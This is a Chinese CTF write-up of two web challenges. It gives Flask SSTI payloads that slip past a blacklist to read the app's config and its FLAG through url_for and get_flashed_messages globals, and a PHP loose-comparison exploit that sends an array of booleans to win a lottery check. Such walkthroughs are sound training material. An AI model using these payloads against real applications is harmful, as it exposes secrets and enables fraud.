# 原创
：  【攻防世界WEB】难度三星9分入门题（下）：shrine、lottery

# 【攻防世界WEB】难度三星9分入门题（下）：shrine、lottery

**目录**

[五、shrine](#%E5%9B%9B%E3%80%81easytornado)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B%EF%BC%9A)

[六、lottery](#%E5%9B%9B%E3%80%81easytornado)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B%EF%BC%9A)

---


## 五、shrine

> 


 

<h3>解题方法：</h3>
1、php源码理解，SSTI（服务器端）模板注入


> 
<h3>过程：</h3>
Ctrl+U
查看源码

 使用了2个模块flask和os模块，看是否能模块注入


app.route传了两个路径

过滤()和'config','self'被加入了黑名单

<hr/>
 访问shrine路径
/shrine/{{1+3}}
进行了运输，存在SSTI（服务器端）模板注入

 

<hr/>
又因为过滤()和'config','self'被加入了黑名单
1、payload：
/shrine/{{url_for.__globals__['current_app'].config}}

<hr/>
2、payload：
/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}<img alt="" height="255" src="https://img-blog.csdnimg.cn/d2be18794efb47a8a33c6b58374564f6.png" width="1200"/>
 


---


---


---


## 六、lottery

> 

 

<h3>解题方法：</h3>
1、逻辑漏洞，弱相等


> 
<h3>过程：</h3>
游走一遍

然后再是注册
<img alt="" height="449" src="https://img-blog.csdnimg.cn/52c3f075da924b34b331c32ff811b2ab.png" width="790"/> 
 <img alt="" height="376" src="https://img-blog.csdnimg.cn/ecd0027ddc5c4183b86d65742f6f2a0f.png" width="753"/>
 

在此处看见了flag

<hr/>
 点击buy后
抓包
出现api.php的post传参

 api.php成了重点
 查看robots.txt发现了
标明不能通过git获得源码<img alt="" height="204" src="https://img-blog.csdnimg.cn/eb7ea33a318149519489c5fdca2753a4.png" width="725"/>
发现题目给的附件
就是源码

 
<hr/>
自动审计
（没啥漏洞）

 自己查看源码
可以发现
1、request是json格式（json支持布尔型数据）

 
2、7位数的对比，是一位一位对比的
3、且使用的是弱相等（TRUE,1,"1"都是相等的，只是类型不同）

 
<hr/>
构造payload
[true,true,true,true,true,true,true]
即改为
{"action":"buy","numbers":[true,true,true,true,true,true,true]}
使用bp抓包

 <img alt="" height="542" src="https://img-blog.csdnimg.cn/fb5c6646a2ba454ba50c75b34fbf5b08.png" width="608"/>
 再点击buy



---

